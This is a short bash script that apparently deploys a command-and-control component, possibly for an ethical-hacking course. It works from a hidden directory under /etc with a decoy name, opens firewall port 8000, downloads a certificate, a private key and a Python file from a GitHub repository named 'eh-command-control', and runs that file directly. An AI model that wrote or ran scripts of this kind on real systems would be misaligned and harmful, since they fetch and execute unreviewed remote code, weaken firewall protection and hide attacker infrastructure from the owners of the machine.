#!/bin/bash
cd /etc/.python-certifications/
firewall-cmd --add-port=8000/tcp
firewall-cmd --reload
curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem -o cert.pem

curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/key.pem -o key.pem
  
curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/week4.py -o week4.py
/usr/bin/python week4.py
